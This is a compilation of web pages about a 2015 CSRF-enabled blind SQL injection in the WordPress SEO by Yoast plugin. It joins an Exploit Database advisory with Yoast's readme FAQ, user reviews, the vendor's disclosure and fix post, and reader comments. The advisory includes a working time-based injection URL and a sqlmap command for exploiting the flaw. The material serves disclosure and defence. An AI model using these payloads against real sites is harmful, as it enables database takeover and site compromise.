Title: WordPress SEO by Yoast <= 1.7.3.3 - Blind SQL Injection
Version/s Tested: 1.7.3.3

Description:

WordPress SEO by Yoast is a popular WordPress plugin (wordpress-seo) used
to improve the Search Engine Optimization (SEO) of WordPress sites. The
latest version at the time of writing (1.7.3.3) has been found to be
affected by two authenticated (admin, editor or author user) Blind SQL
Injection vulnerabilities. The plugin has more than one million downloads
according to WordPress.

Technical Description:

The authenticated Blind SQL Injection vulnerability can be found within the
'admin/class-bulk-editor-list-table.php' file. The orderby and order GET
parameters are not sufficiently sanitised before being used within a SQL
query.

Line 529:

$orderby = ! empty( $_GET['orderby'] ) ? esc_sql( sanitize_text_field(
$_GET['orderby'] ) ) : 'post_title';

Line 533:

order = esc_sql( strtoupper( sanitize_text_field( $_GET['order'] ) ) );

If the GET orderby parameter value is not empty it will pass its value
through WordPess's own esc_sql() function. According to WordPress this
function 'Prepares a string for use as an SQL query. A glorified
addslashes() that works with arrays.'. However, this is not sufficient to
prevent SQL Injection as can be seen from our Proof of Concept.

Proof of Concept (PoC):

The following GET request will cause the SQL query to execute and sleep for
10 seconds if clicked on as an authenticated admin, editor or author user.

<http://127.0.0.1/wp-admin/admin.php?page=wpseo_bulk-editor&type=title&orderby=post_date%2c>(select%20*%20from%20(select(sleep(10)))a)&order=asc

Using SQLMap:

python sqlmap.py -u "
<http://127.0.0.1/wp-admin/admin.php?page=wpseo_bulk-editor&type=title&orderby=post_date*&order=asc">;
--batch --technique=B --dbms=MySQL --cookie="wordpress_9d...;
wordpress_logged_in_9dee67...;"

Impact:

As there is no anti-CSRF protection a remote unauthenticated attacker could
use this vulnerability to execute arbitrary SQL queries on the victim
WordPress web site by enticing an authenticated admin, editor or author
user to click on a specially crafted link or visit a page they control.

One possible attack scenario would be an attacker adding their own
administrative user to the target WordPress site, allowing them to
compromise the entire web site.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

## Installation

Starting with Yoast SEO consists of just two steps: installing and setting up the plugin. Yoast SEO is designed to work with your site’s specific needs, so don’t forget to go through the Yoast SEO first-time configuration as explained in the ‘after activation’ step! For the most up-to-date guidance on how to install Yoast SEO products, [please visit our help center](https://yoast.com/help/yoast-installation-manuals/#h-yoast-seo-and-yoast-seo-premium-for-wordpress).

## FAQ

### How do the XML Sitemaps in the Yoast SEO plugin work?

Having an XML sitemap can be beneficial for SEO, as Google can retrieve essential pages of a website very fast, even if the internal linking of a site isn’t flawless.

The sitemap index and individual sitemaps are updated automatically as you add or remove content and will include the post types you want search engines to index. Post Types marked as noindex will not appear in the sitemap. [Learn more about XML Sitemaps](https://yoa.st/3qt).

### How can I add my website to Google Search Console?

It is straightforward to add your website to Google Search Console.

1. Create a Google Search Console account and login into your account.

2. Click ‘Add a property’ under the search drop-down.

3. Enter your website URL in the box and click ‘Continue’.

4. Click the arrow next to ‘HTML tag’ to expand the option.

5. Copy the meta tag.

6. Log in to your WordPress website.

7. Click on ‘SEO’ in the dashboard.

8. Click on ‘General’.

9. Click on the ‘Webmaster Tools’ tab.

10. Paste the code in the Google field and click ‘Save Changes’.

11. Go back to Google Search Console and click ‘Verify’.

If you want more details steps, please visit [our article on our help center](https://yoa.st/3qu).

### How do I implement Yoast SEO breadcrumbs?

The steps below are a temporary solution as manual edits made to theme files may be overwritten with future theme updates. Please contact the theme developer for a permanent solution. We’ve written an article about the [importance of breadcrumbs for SEO](https://yoa.st/3qv).

To implement the [breadcrumbs](https://yoa.st/3qw) function in Yoast SEO, you will have to edit your theme. We recommend that prior to any editing of the theme files, a backup is taken. Your host provider can help you take a backup.

Copy the following code into your theme where you want the breadcrumbs to be. If you are not sure, you will need to experiment with placement:

```
<?php
if ( function_exists( 'yoast_breadcrumb' ) ) {
    yoast_breadcrumb( '<p id="breadcrumbs">','</p>' );
}
?>

```

Common places where you could place your breadcrumbs are inside your `single.php` and/or `page.php` file just above the page’s title. Another option that makes it really easy in some themes is by just pasting the code in `header.php` at the very end.

In most non-WooTheme themes, this code snippet should not be added to your `functions.php` file.

Alternatively, you can manually add the breadcrumb shortcode to individual posts or pages: `[wpseo_breadcrumb]`

If you need more details or a step by step guide, read our [Implementation guide for Yoast SEO breadcrumbs](https://yoa.st/3qx).

### How do I noindex URLS?

Yoast SEO provides multiple options for setting a URL or group of URLs to noindex. [Read more about how to do this in this guide](https://yoa.st/3qy/).

### Google shows the wrong description, how do I fix this?

If you’ve crafted nice meta descriptions for your blog posts, nothing is more annoying than Google showing another description for your site completely in the search result snippet.

Possible causes could be:

1. wrong description in code

2. Google cache is outdated

3. Search term manipulation

4. Google ignored the meta description

You can [read more here on how to solve the issue with the wrong description](https://yoa.st/3qz).

### How often is Yoast SEO updated?

Yoast SEO is updated every two weeks. If you want to know why, please read [this post on why we release every two weeks](https://yoa.st/3q-)!

### How do I get support?

As our free plugin is used by millions of people worldwide, we cannot offer you all one on one support. If you have trouble with the Yoast SEO for WordPress plugin, you can get help on the support forums here at [wordpress.org](https://wordpress.org/support/plugin/wordpress-seo/) or by checking out our help center at [yoast.com/help/](https://yoa.st/3r1).

The plugins you buy at Yoast are called ‘premium plugins’ (even if Premium isn’t in its name) and include a complete year of free updates and premium support. This means you can contact our support team if you have any questions about that plugin.

[Read more on how to get support](https://yoa.st/3r2)

### What happens to my data if I enable usage tracking?

[This page on yoast.com explains what data we collect to improve Yoast SEO](https://yoa.st/4w7). We only collect data when you explicitly opt in. Read more about how we handle your data in [our Privacy Policy](https://yoa.st/4w8).

### [Paid support non existent](https://wordpress.org/support/topic/paid-support-non-existent/)

[gengisc](https://profiles.wordpress.org/gengisc/ "Posts by gengisc")
January 25, 2025

I paid for Yoast WooCommerce Premium bundle in late 2023. During that time I sent several support emails regarding an issue with multi-language sitemap, I got the automated “we received your email”, but no answer whatsoever from the support team. Before renewing I went back to try and solve this issue, they won’t give support via emails (because I’m no longer premium, even though I used the same 2023 email thread so they could see they didn’t answer back then).
If you are thinking on paying a premium add-on or bundle, DO NOT, you will get between 0 support, and copy-paste responses.
If you are thinking of using the free version for a non-translated website, go ahead, it’s a bit bloated and almost everything is paid, but for very simple cases, works (even though for simple cases I would use others).
If the issue I’ve been dragging over an over for a year gets solved, I will post an update here.

2 star for the free version. Ive tried different SEO plugin I will not mentioned those names but I have publish a new website and I tried using this plugin for the 2nd time after several years but the features that were free before are now paid. Basically if you are using free version its just a bloated plugin so instead just use a different SEO plugin if you arent planning to get the premium one.
4 star for paid version. I can see a lot of good features but i dont have access since im only using free version maybe i can give this 5 star rating if im able to test out those paid features.

I remember using this plugin a long time ago. Now I’ve come back to it for a new blog and it seems a lot more bloated than earlier versions. It still works, and is easy to use, but there are a lot of unnecessary features too. A lot of upselling and banner ads etc.

4.6 / 5](https://www.g2.com/products/yoast-yoast/reviews)

This morning we released an update to our WordPress SEO plugin (both free and premium) that fixes a security issue. A bit more details follow below, but the short version of this post is simple: update. Now. Although you might find your WordPress install has already updated for you.

## What did we fix?

We fixed a CSRF issue that allowed blind SQL injection. The one sentence explanation for the not so technical: by having a logged-in author, editor or admin visit a malformed URL a malicious hacker could change your database. While this does not allow mass hacking of installs using this hole, it does allow direct targeting of a user on a website. This is a serious issue, which is why we immediately set to work to fix it when we were notified of the issue.

Why we didn’t catch it? Well… Long story. It should have been caught in one of our regular security reviews. The values were escaped using `esc_sql`, which one would expect would prevent SQL injection. It does not. You’ll need far stricter sanitization. Not an excuse but it’s a good lesson to learn for other developers.

## Responsible disclosure

We were notified of this issue by Ryan Dewhurst of the WPScan team, who waited for us to release an update before [publishing his find](https://wpvulndb.com/vulnerabilities/7841) to the public, for which we thank him! This type of responsible disclosure is what keeps us all safe, but it only does so *if you update*.

## Forced automatic update

Because of the severity of the issue, the WordPress.org team put out a forced automatic update (thanks!). If you didn’t specifically disable those and you were:

* running on 1.7 or higher, you’ll have been auto-updated to 1.7.4.
* If you were running on 1.6.\*, you’ll have been updated to 1.6.4.
* If you were running on 1.5.\*, you’ll have been updated to 1.5.7.

If you are on an older version, we can’t auto-update you, but you should really update for *tons* of reasons. Of course you should really move to 1.7.4 as soon as you can anyway.

> **Note:** If you’re using WordPress SEO Premium, you should immediately update to version 1.5.3. You can find the how-to in our [knowledge base](https://yoast.com/help/how-can-i-update-my-premium-plugin/).

   looks like you didn’t like my other email address as my previous reply looks like it went through.. here is my issue:

   i recently took over a site that is using thyis plugin version 1.5.2.6 and when i upgrade to 1.7.4, the site breaks.. all of the pages give a ‘not found’ and i’m not sure why. i don’t think the previous person did any custom coding as they weren’t technical enough but they did update a lot of the settings for this plugin. is there something i can look at that makes this happen that maybe someone else encountered?

   Love the plugin but I’ve had to disable WordPress SEO (1.7.4) as it doesn’t work with my WordPress 4.1.1 running the Radius theme – happy to pay for the premium version, but need assurances it will work first!

   It’s nice to see such a great plugin actively maintained. When i first heard about this security patch it was from another sources. Yet my dashboard was saying there are no updates available.

   Later i saw it was done automatically .

    Hi,

    I have WordPress SEO on version 1.5.3 and it doesn’t give me the option to update. Also when I go to Plugins and search to download a newer version the option isn’t there.

    How do i get to 1.7.4?

    My version hasn’t auto updated (currently 1.7.1) yet.

    If I just download and do a manual update, is that ok? Will I keep all my settings from the current version? Should I deactivate 1.7.1 first or just install 1.7.4? Thanks

    Is there already any news on what to with affected sites, we had a massive break in on three sites on the same shared hosting on the 11th at around midnight (the plugin was at that time not updated), malicious files were uploaded, unknown admins registered and tons of posts inserted directly through SQL.

    After following whatever I could find it seems I have managed to banish the unauthorized access yet the posts like this one:

    <http://mosaic-stone.com/1080p-the-judge-ita/>

    are still there, WordPress does say that there is 29000+ posts, yet I cannot see them. I haven’t found any literature on systems affected by this bug yet and was wondering if anyone would know what to do.

    Actually the websites don’t contain any posts posted by me so if there is an SQL trick to simply delete all of them this would probably suffice.

    Just few days ago, I activated the automatic plugin update feature in my WordPress, and now I can thanks to the option for securing my websites while I was enjoying my sleep.

    @ambrosite asked what the fix was but no answer.

    It looks like WPSEO\_Utils::filter\_input() is called, which calls filter\_input(). As FILTER\_DEFAULT is filter used (without any flags) and PHP docs says: “This will result in no filtering taking place by default.”, how does this fix the issue?

    I have to say, “one would expect this would prevent an SQL injection” is somewhat rude.

    I write code that is used by almost nobody, and I take the time – my own time – to read the documentation of every single function I call.

    I don’t want to diminish your character or the nature of your contributions to the Internet and to WordPress as a whole, but this is a very flagrant piece of damage control. I’m compelled to call it out, I was recommending Yoast to my employer just this morning and I am quite embarssed. I really do regret it, now. Sorry, Joost but… they run a serious business and will be targeted.

    Shame.

      Hey Adam,

      first of all, this code was contributed by an external developer. Second, this was reviewed multiple times and not found before. If you can guarantee me that if I let you do code reviews we’ll never find anything again in the code you have reviewed, I’d like to hire you!

        That’s an incredibly positive response Joost, I’m going to make sure I learn from you here.

        Come to think of it, I now owe you one free code review… let’s actually see what I’m getting into, then.

        All of the positive feedback here had me wondering if responses were being deleted. So at the very least my attack can serve as a testament that you stand by your work.

        “…which one would expect would prevent SQL injection. It does not.”

        If ‘one would expect’ was your way of excusing the contributor’s mistake, I’ve appalled myself. I thought you were referring to yourself. There is no shame in making it clear this was another person’s mistake. I originally read that statement as a reference to your personal coding habits.

        I’m very embarassed. Best regards.

      Hi,

      I have the same question as Marc.

      I downloaded version 1.5.7 from here: <https://wordpress.org/plugins/wordpress-seo/developers/> and went to manually install the plugin, but when I looked in the backend, it said it was still on 1.5.6

      I then opened up the files and readme and saw no evidence that what I downloaded was version 1.5.7 despite it being labeled: wordpress-seo.1.5.7.zip

      Where can I get the real 1.5.7?

    I noticed that the forced automatic update has deactivated the plugin on every install that I’ve seen so far, about 10 at this point. Obviously, the security fix was a must and if this is the price of being secure, then so be it. But, fair warning to all, if you have clients that had this plugin installed on a site that you handed over, you may be getting a call at some point in the future if their indexing starts to look off and they don’t know about this.

    Joost, can we get more technical details on what exactly you had to do to fix this security issue? It is rather worrying to hear that you needed “far stricter sanitization” than esc\_sql, since that function ultimately just calls mysql\_real\_escape\_string (as does wpdb::prepare), which has been the standard security advice for years. In fact the data validation page in the WordPress Codex still recommends the use of those functions:

      Read the code, you can see what we did. We restricted both parameters to a defined set of values instead of allowing any string value.

    Hey, this fix broke my website. The following PHP code I have in the head of my WordPress breaks the site:

    $object = new WPSEO\_Frontend();

    if( $object ){

    echo $object->metadesc( false );

    } else{

    echo “Sample Text”;

    }

    I have since removed it. Would anyone happen to know what the new code should be? Basically it should pull in the meta description (From the plugin) IF the user has entered it in the WordPress CMS, otherwise echo “Sample Text”.

    Thank you!

      I don’t know how you’ve updated? That’s not an error people get when updating through WordPress.org.

        Getting that error as well on our installs. Same line number and normally we do our upgrades from wordpress.org after manually reviewing what’s coming down on a test install.

        The full error:

        PHP message: PHP Fatal error: Class ‘WPSEO\_Utils’ not found in /usr/share/nginx/www/wordpress/wp-content/plugins/wordpress-seo/admin/class-admin.php on line 78″ while reading response header from upstream, client: 1.2.3.4, server: ourwebsite.tld, request: “GET /wp-admin/ HTTP/1.1”, upstream: “fastcgi://unix:/var/run/php5-fpm.sock:”, host: “ourwebsite.tld”

        There’s at least 1 thread on the wp.org forums asking for help about it.

          “normally we do our upgrades from wordpress.org after manually reviewing what’s coming down on a test install”: are you removing the old plugin dir and replacing it with a full extract of the new one? Sounds like you’re missing our vendor directory (which contains the auto-load files).

        Hmmm, it was working prior to the mandantory push by WordPress. Interestingly I moved the wordpress-seo folder out of the way, downloaded the version from your site, and uploaded. As soon as I activate the plugin it fails. When can one download the previous version from ? Would like to get it running again so that can export SEO settings, completely delete the plugin and data, and then import. Thank you.

    Hi,

    I’m glad you fixed the problem quickly for all your users ad thanks for that!

    At the end of the article it says :

    “Note: If you’re using WordPress SEO Premium, you should immediately update to version 1.5.3. You can find the how-to in our knowledge base.”

    Is the version 1.5.3 the version of the main pluggin or the version of the premium pluggin? Because on all my sites, I have the version 1.3.4.1 of “Local SEO for WordPress SEO by Yoast”.

    Thanks for the help!

    I’ve updated to your plugin Version 1.7.4. However, I’m getting a security alert from Vaultpress.com security scan which says the following:

    “The plugin WordPress SEO (version 1.14.15) has a publicly known vulnerability. It is recommended deactivate and remove this plugin until a new version is released.”

    I suspect this is a false positive – perhaps something to do with the versioning system?? Have opened a ticket with Vaultpress, so will see what they say

    By the way, thanks for the fast plugin update and explanatory article.

      VaultPress is reading the version number wrong, trying to figure out who to talk to on their end.

        I just got this email from Vaultpress re the issue:

        “Version 1.7.4 is definitely safe, as it is the latest version released on the WordPress.org repository: <https://wordpress.org/plugins/wordpress-seo/changelog/>

        WordPress SEO by Yoast changed their versioning number a while back which led to this conflict. Everything should be good though.”

    Would the forced update leave the plug-in deactivated if it was active when the update was pushed? My plug-in was deactivated sometime in the last 24 hours, and it has been auto-updated by the forced update to 1.7.4.

      Which hosting where you using? Some shared or wordpress exclusive servers may automatically disallow a plugin when they’re reported of a security issue

    Personally I wouldn’t say this was a real security update. More of a minor bug fix. The fact it needed a targeted attack to execute kind of makes it like every day on the internet.

    If they gunna get you they will do.
